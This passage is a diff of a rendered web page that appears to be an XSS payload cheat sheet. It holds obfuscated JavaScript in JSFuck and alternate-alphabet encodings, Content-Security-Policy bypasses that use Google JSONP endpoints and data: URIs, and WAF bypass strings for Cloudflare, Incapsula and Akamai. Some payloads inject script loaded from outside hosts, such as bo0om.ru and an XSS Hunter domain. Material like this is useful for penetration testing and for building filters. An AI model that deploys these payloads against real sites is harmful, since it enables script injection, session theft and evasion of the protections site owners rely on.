 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">ᨆ</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>,<span style="color:#a6e22e">ᨊ</span><span style="color:#f92672">=!</span><span style="color:#a6e22e">ᨆ</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ᨆ</span>,<span style="color:#a6e22e">ᨎ</span><span style="color:#f92672">=!</span><span style="color:#a6e22e">ᨊ</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ᨆ</span>,<span style="color:#a6e22e">ᨂ</span><span style="color:#f92672">=</span><span style="color:#a6e22e">ᨆ</span><span style="color:#f92672">+</span>{},<span style="color:#a6e22e">ᨇ</span><span style="color:#f92672">=</span><span style="color:#a6e22e">ᨊ</span>[<span style="color:#a6e22e">ᨆ</span><span style="color:#f92672">++</span>],<span style="color:#a6e22e">ᨋ</span><span style="color:#f92672">=</span><span style="color:#a6e22e">ᨊ</span>[<span style="color:#a6e22e">ᨏ</span><span style="color:#f92672">=</span><span style="color:#a6e22e">ᨆ</span>],<span style="color:#a6e22e">ᨃ</span><span style="color:#f92672">=++</span><span style="color:#a6e22e">ᨏ</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ᨆ</span>,<span style="color:#a6e22e">ᨅ</span><span style="color:#f92672">=</span><span style="color:#a6e22e">ᨂ</span>[<span style="color:#a6e22e">ᨏ</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ᨃ</span>],<span style="color:#a6e22e">ᨊ</span>[<span style="color:#a6e22e">ᨅ</span><span style="color:#f92672">+=</span><span style="color:#a6e22e">ᨂ</span>[<span style="color:#a6e22e">ᨆ</span>]<span style="color:#f92672">+</span>(<span style="color:#a6e22e">ᨊ</span>.<span style="color:#a6e22e">ᨎ</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ᨂ</span>)[<span style="color:#a6e22e">ᨆ</span>]<span style="color:#f92672">+</span><span style="color:#a6e22e">ᨎ</span>[<span style="color:#a6e22e">ᨃ</span>]<span style="color:#f92672">+</span><span style="color:#a6e22e">ᨇ</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ᨋ</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ᨊ</span>[<span style="color:#a6e22e">ᨏ</span>]<span style="color:#f92672">+</span><span style="color:#a6e22e">ᨅ</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ᨇ</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ᨂ</span>[<span style="color:#a6e22e">ᨆ</span>]<span style="color:#f92672">+</span><span style="color:#a6e22e">ᨋ</span>][<span style="color:#a6e22e">ᨅ</span>](<span style="color:#a6e22e">ᨎ</span>[<span style="color:#a6e22e">ᨆ</span>]<span style="color:#f92672">+</span><span style="color:#a6e22e">ᨎ</span>[<span style="color:#a6e22e">ᨏ</span>]<span style="color:#f92672">+</span><span style="color:#a6e22e">ᨊ</span>[<span style="color:#a6e22e">ᨃ</span>]<span style="color:#f92672">+</span><span style="color:#a6e22e">ᨋ</span><span style="color:#f92672">+</span><span style="color:#a6e22e">ᨇ</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;(ᨆ)&#34;</span>)()
-</span></span></code></pre></div><p>More alphabets on 
-  <a href="http://aem1k.com/aurebesh.js/#">http://aem1k.com/aurebesh.js/#</a></p>
+</span></span></code></pre></div><p>More alphabets on <a href="http://aem1k.com/aurebesh.js/#">http://aem1k.com/aurebesh.js/#</a></p>
 <h3 id="bypass-using-ecmascript6">
   Bypass using ECMAScript6
   <a class="anchor" href="#bypass-using-ecmascript6">#</a>
@@ -2398,69 +2352,56 @@ BOM character allows you to override charset of the page</p>
   Bypass using jsfuck
   <a class="anchor" href="#bypass-using-jsfuck">#</a>
 </h3>
-<p>Bypass using 
-  <a href="http://www.jsfuck.com/">jsfuck</a></p>
+<p>Bypass using <a href="http://www.jsfuck.com/">jsfuck</a></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>[][(<span style="color:#f92672">!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+</span>[]]<span style="color:#f92672">+</span>([<span style="color:#f92672">!</span>[]]<span style="color:#f92672">+</span>[][[]])[<span style="color:#f92672">+!+</span>[]<span style="color:#f92672">+</span>[<span style="color:#f92672">+</span>[]]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">!+</span>[]<span style="color:#f92672">+!+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">!+</span>[]<span style="color:#f92672">+!+</span>[]<span style="color:#f92672">+!+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+!+</span>[]]][([][(<span style="color:#f92672">!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+</span>[]]<span style="color:#f92672">+</span>([<span style="color:#f92672">!</span>[]]<span style="color:#f92672">+</span>[][[]])[<span style="color:#f92672">+!+</span>[]<span style="color:#f92672">+</span>[<span style="color:#f92672">+</span>[]]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">!+</span>[]<span style="color:#f92672">+!+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">!+</span>[]<span style="color:#f92672">+!+</span>[]<span style="color:#f92672">+!+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+!+</span>[]]]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">!+</span>[]<span style="color:#f92672">+!+</span>[]<span style="color:#f92672">+!+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[][(<span style="color:#f92672">!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+</span>[]]<span style="color:#f92672">+</span>([<span style="color:#f92672">!</span>[]]<span style="color:#f92672">+</span>[][[]])[<span style="color:#f92672">+!+</span>[]<span style="color:#f92672">+</span>[<span style="color:#f92672">+</span>[]]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">!+</span>[]<span style="color:#f92672">+!+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">!+</span>[]<span style="color:#f92672">+!+</span>[]<span style="color:#f92672">+!+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+!+</span>[]]])[<span style="color:#f92672">+!+</span>[]<span style="color:#f92672">+</span>[<span style="color:#f92672">+</span>[]]]<span style="color:#f92672">+</span>([][[]]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+!+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">!+</span>[]<span style="color:#f92672">+!+</span>[]<span style="color:#f92672">+!+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+!+</span>[]]<span style="color:#f92672">+</span>([][[]]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+</span>[]]<span style="color:#f92672">+</span>([][(<span style="color:#f92672">!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+</span>[]]<span style="color:#f92672">+</span>([<span style="color:#f92672">!</span>[]]<span style="color:#f92672">+</span>[][[]])[<span style="color:#f92672">+!+</span>[]<span style="color:#f92672">+</span>[<span style="color:#f92672">+</span>[]]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">!+</span>[]<span style="color:#f92672">+!+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">!+</span>[]<span style="color:#f92672">+!+</span>[]<span style="color:#f92672">+!+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+!+</span>[]]]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">!+</span>[]<span style="color:#f92672">+!+</span>[]<span style="color:#f92672">+!+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[][(<span style="color:#f92672">!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+</span>[]]<span style="color:#f92672">+</span>([<span style="color:#f92672">!</span>[]]<span style="color:#f92672">+</span>[][[]])[<span style="color:#f92672">+!+</span>[]<span style="color:#f92672">+</span>[<span style="color:#f92672">+</span>[]]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">!+</span>[]<span style="color:#f92672">+!+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">!+</span>[]<span style="color:#f92672">+!+</span>[]<span style="color:#f92672">+!+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+!+</span>[]]])[<span style="color:#f92672">+!+</span>[]<span style="color:#f92672">+</span>[<span style="color:#f92672">+</span>[]]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+!+</span>[]]]((<span style="color:#f92672">!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+!+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">!+</span>[]<span style="color:#f92672">+!+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">!+</span>[]<span style="color:#f92672">+!+</span>[]<span style="color:#f92672">+!+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+!+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!</span>[]<span style="color:#f92672">+</span>[][(<span style="color:#f92672">!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+</span>[]]<span style="color:#f92672">+</span>([<span style="color:#f92672">!</span>[]]<span style="color:#f92672">+</span>[][[]])[<span style="color:#f92672">+!+</span>[]<span style="color:#f92672">+</span>[<span style="color:#f92672">+</span>[]]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">!+</span>[]<span style="color:#f92672">+!+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">!+</span>[]<span style="color:#f92672">+!+</span>[]<span style="color:#f92672">+!+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+!+</span>[]]])[<span style="color:#f92672">!+</span>[]<span style="color:#f92672">+!+</span>[]<span style="color:#f92672">+</span>[<span style="color:#f92672">+</span>[]]]<span style="color:#f92672">+</span>[<span style="color:#f92672">+!+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[][(<span style="color:#f92672">!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+</span>[]]<span style="color:#f92672">+</span>([<span style="color:#f92672">!</span>[]]<span style="color:#f92672">+</span>[][[]])[<span style="color:#f92672">+!+</span>[]<span style="color:#f92672">+</span>[<span style="color:#f92672">+</span>[]]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">!+</span>[]<span style="color:#f92672">+!+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">!+</span>[]<span style="color:#f92672">+!+</span>[]<span style="color:#f92672">+!+</span>[]]<span style="color:#f92672">+</span>(<span style="color:#f92672">!!</span>[]<span style="color:#f92672">+</span>[])[<span style="color:#f92672">+!+</span>[]]])[<span style="color:#f92672">!+</span>[]<span style="color:#f92672">+!+</span>[]<span style="color:#f92672">+</span>[<span style="color:#f92672">+</span>[]]])()
 </span></span></code></pre></div><h2 id="csp-bypass">
   CSP Bypass
   <a class="anchor" href="#csp-bypass">#</a>
 </h2>
-<p>Check the CSP on 
-  <a href="https://csp-evaluator.withgoogle.com">https://csp-evaluator.withgoogle.com</a> and the post : 
-  <a href="https://websecblog.com/vulns/google-csp-evaluator/">How to use Google’s CSP Evaluator to bypass CSP</a></p>
+<p>Check the CSP on <a href="https://csp-evaluator.withgoogle.com">https://csp-evaluator.withgoogle.com</a> and the post : <a href="https://websecblog.com/vulns/google-csp-evaluator/">How to use Google’s CSP Evaluator to bypass CSP</a></p>
 <h3 id="bypass-csp-using-jsonp-from-google-trick-by-apfeifer27httpstwittercomapfeifer27">
-  Bypass CSP using JSONP from Google (Trick by 
-  <a href="https://twitter.com/apfeifer27">@apfeifer27</a>)
+  Bypass CSP using JSONP from Google (Trick by <a href="https://twitter.com/apfeifer27">@apfeifer27</a>)
   <a class="anchor" href="#bypass-csp-using-jsonp-from-google-trick-by-apfeifer27httpstwittercomapfeifer27">#</a>
 </h3>
 <p>//google.com/complete/search?client=chrome&amp;jsonp=alert(1);</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">/</span><span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#75715e">//google.com/complete/search?client=chrome%26jsonp=alert(1);&gt;&#34;
 </span></span></span></code></pre></div><p>More JSONP endpoints:</p>
 <ul>
-<li>
-  <a href="Intruders/jsonp_endpoint.txt">/Intruders/jsonp_endpoint.txt</a></li>
-<li>
-  <a href="https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt">JSONBee/jsonp.txt</a></li>
+<li><a href="Intruders/jsonp_endpoint.txt">/Intruders/jsonp_endpoint.txt</a></li>
+<li><a href="https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt">JSONBee/jsonp.txt</a></li>
 </ul>
 <h3 id="bypass-csp-by-labwallarmcomhttpslabwallarmcomhow-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa">
-  Bypass CSP by 
-  <a href="https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa">lab.wallarm.com</a>
+  Bypass CSP by <a href="https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa">lab.wallarm.com</a>
   <a class="anchor" href="#bypass-csp-by-labwallarmcomhttpslabwallarmcomhow-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa">#</a>
 </h3>
-<p>Works for CSP like <code>Content-Security-Policy: default-src 'self' 'unsafe-inline';</code>, 
-  <a href="http://hsts.pro/csp.php?xss=f=document.createElement%28%22iframe%22%29;f.id=%22pwn%22;f.src=%22/robots.txt%22;f.onload=%28%29=%3e%7Bx=document.createElement%28%27script%27%29;x.src=%27//bo0om.ru/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;">POC here</a></p>
+<p>Works for CSP like <code>Content-Security-Policy: default-src 'self' 'unsafe-inline';</code>, <a href="http://hsts.pro/csp.php?xss=f=document.createElement%28%22iframe%22%29;f.id=%22pwn%22;f.src=%22/robots.txt%22;f.onload=%28%29=%3e%7Bx=document.createElement%28%27script%27%29;x.src=%27//bo0om.ru/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;">POC here</a></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">script</span><span style="color:#f92672">=</span>document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;script&#39;</span>);
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">script</span>.<span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;//bo0om.ru/csp.js&#39;</span>;
 </span></span><span style="display:flex;"><span>window.<span style="color:#a6e22e">frames</span>[<span style="color:#ae81ff">0</span>].document.<span style="color:#a6e22e">head</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">script</span>);
 </span></span></code></pre></div><h3 id="bypass-csp-by-rhynoraterhttpsgistgithubcomrhynorater311cf3981fda8303d65c27316e69209f">
-  Bypass CSP by 
-  <a href="https://gist.github.com/Rhynorater/311cf3981fda8303d65c27316e69209f">Rhynorater</a>
+  Bypass CSP by <a href="https://gist.github.com/Rhynorater/311cf3981fda8303d65c27316e69209f">Rhynorater</a>
   <a class="anchor" href="#bypass-csp-by-rhynoraterhttpsgistgithubcomrhynorater311cf3981fda8303d65c27316e69209f">#</a>
 </h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// CSP Bypass with Inline and Eval
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">d</span><span style="color:#f92672">=</span>document;<span style="color:#a6e22e">f</span><span style="color:#f92672">=</span><span style="color:#a6e22e">d</span>.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#34;iframe&#34;</span>);<span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#a6e22e">d</span>.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;link[href*=&#34;.css&#34;]&#39;</span>).<span style="color:#a6e22e">href</span>;<span style="color:#a6e22e">d</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">append</span>(<span style="color:#a6e22e">f</span>);<span style="color:#a6e22e">s</span><span style="color:#f92672">=</span><span style="color:#a6e22e">d</span>.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#34;script&#34;</span>);<span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://[YOUR_XSSHUNTER_USERNAME].xss.ht&#34;</span>;<span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">function</span>(){<span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">contentWindow</span>.document.<span style="color:#a6e22e">head</span>.<span style="color:#a6e22e">append</span>(<span style="color:#a6e22e">s</span>);},<span style="color:#ae81ff">1000</span>)
 </span></span></code></pre></div><h3 id="bypass-csp-by-akita_zenhttpstwittercomakita_zen">
-  Bypass CSP by 
-  <a href="https://twitter.com/akita_zen">@akita_zen</a>
+  Bypass CSP by <a href="https://twitter.com/akita_zen">@akita_zen</a>
   <a class="anchor" href="#bypass-csp-by-akita_zenhttpstwittercomakita_zen">#</a>
 </h3>
 <p>Works for CSP like <code>script-src self</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">object</span> <span style="color:#a6e22e">data</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/object&gt;</span>
 </span></span></code></pre></div><h3 id="bypass-csp-by-404deathhttpstwittercom404deathstatus1191222237782659072">
-  Bypass CSP by 
-  <a href="https://twitter.com/404death/status/1191222237782659072">@404death</a>
+  Bypass CSP by <a href="https://twitter.com/404death/status/1191222237782659072">@404death</a>
   <a class="anchor" href="#bypass-csp-by-404deathhttpstwittercom404deathstatus1191222237782659072">#</a>
 </h3>
-<p>Works for CSP like <code>script-src 'self' data:</code> as warned about in the official 
-  <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src">mozilla documentation</a>.</p>
+<p>Works for CSP like <code>script-src 'self' data:</code> as warned about in the official <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src">mozilla documentation</a>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;data:,alert(1)&#34;</span><span style="color:#f92672">&gt;</span><span style="color:#960050;background-color:#1e0010">/&lt;/script&gt;</span>
 </span></span></code></pre></div><h2 id="common-waf-bypass">
   Common WAF Bypass
   <a class="anchor" href="#common-waf-bypass">#</a>
 </h2>
 <h3 id="cloudflare-xss-bypasses-by-bohdan-korzhynskyihttpstwittercombohdansec">
-  Cloudflare XSS Bypasses by 
-  <a href="https://twitter.com/bohdansec">@Bohdan Korzhynskyi</a>
+  Cloudflare XSS Bypasses by <a href="https://twitter.com/bohdansec">@Bohdan Korzhynskyi</a>
   <a class="anchor" href="#cloudflare-xss-bypasses-by-bohdan-korzhynskyihttpstwittercombohdansec">#</a>
 </h3>
 <h4 id="25st-january-2021">
@@ -2506,49 +2447,41 @@ BOM character allows you to override charset of the page</p>
   <a class="anchor" href="#chrome-auditor---9th-august-2018">#</a>
 </h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;&lt;svg&gt;&lt;script&gt;alert(1)-%26apos%3B</span>
-</span></span></code></pre></div><p>Live example by @brutelogic - 
-  <a href="https://brutelogic.com.br/xss.php?c1=%3c/script%3e%3csvg%3e%3cscript%3ealert%281%29-%26apos%3B">https://brutelogic.com.br/xss.php</a></p>
+</span></span></code></pre></div><p>Live example by @brutelogic - <a href="https://brutelogic.com.br/xss.php?c1=%3c/script%3e%3csvg%3e%3cscript%3ealert%281%29-%26apos%3B">https://brutelogic.com.br/xss.php</a></p>
 <h3 id="incapsula-waf-bypass-by-alra3eeshttpstwittercomalra3eesstatus971847839931338752--8th-march-2018">
-  Incapsula WAF Bypass by 
-  <a href="https://twitter.com/Alra3ees/status/971847839931338752">@Alra3ees</a>- 8th March 2018
+  Incapsula WAF Bypass by <a href="https://twitter.com/Alra3ees/status/971847839931338752">@Alra3ees</a>- 8th March 2018
   <a class="anchor" href="#incapsula-waf-bypass-by-alra3eeshttpstwittercomalra3eesstatus971847839931338752--8th-march-2018">#</a>
 </h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">anythinglr00</span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;uxldz</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">anythinglr00</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">c</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#a6e22e">fscript</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">e</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">cscript</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">ealert</span>(document.<span style="color:#a6e22e">domain</span>)<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">c</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#a6e22e">fscript</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">euxldz</span>
 </span></span></code></pre></div><h3 id="incapsula-waf-bypass-by-c0d3g33khttpstwittercomc0d3g33k---11th-september-2018">
-  Incapsula WAF Bypass by 
-  <a href="https://twitter.com/c0d3G33k">@c0d3G33k</a> - 11th September 2018
+  Incapsula WAF Bypass by <a href="https://twitter.com/c0d3G33k">@c0d3G33k</a> - 11th September 2018
   <a class="anchor" href="#incapsula-waf-bypass-by-c0d3g33khttpstwittercomc0d3g33k---11th-september-2018">#</a>
 </h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">object</span> <span style="color:#a6e22e">data</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&#39;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/object&gt;</span>
 </span></span></code></pre></div><h3 id="incapsula-waf-bypass-by-daveysechttpstwittercomdaveysecstatus1126999990658670593---11th-may-2019">
-  Incapsula WAF Bypass by 
-  <a href="https://twitter.com/daveysec/status/1126999990658670593">@daveysec</a> - 11th May 2019
+  Incapsula WAF Bypass by <a href="https://twitter.com/daveysec/status/1126999990658670593">@daveysec</a> - 11th May 2019
   <a class="anchor" href="#incapsula-waf-bypass-by-daveysechttpstwittercomdaveysecstatus1126999990658670593---11th-may-2019">#</a>
 </h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">svg</span> <span style="color:#a6e22e">onload</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">r</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">n</span><span style="color:#f92672">=</span><span style="color:#e6db74">$.globalEval(&#34;al&#34;+&#34;ert()&#34;);</span>&gt;
 </span></span></code></pre></div><h3 id="akamai-waf-bypass-by-zseanohttpstwittercomzseano---18th-june-2018">
-  Akamai WAF Bypass by 
-  <a href="https://twitter.com/zseano">@zseano</a> - 18th June 2018
+  Akamai WAF Bypass by <a href="https://twitter.com/zseano">@zseano</a> - 18th June 2018
   <a class="anchor" href="#akamai-waf-bypass-by-zseanohttpstwittercomzseano---18th-june-2018">#</a>
 </h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">?</span><span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;&lt;base%20c%3D=href%3Dhttps:\mysite&gt;</span>
 </span></span></code></pre></div><h3 id="akamai-waf-bypass-by-s0md3vhttpstwittercoms0md3vstatus1056447131362324480---28th-october-2018">
-  Akamai WAF Bypass by 
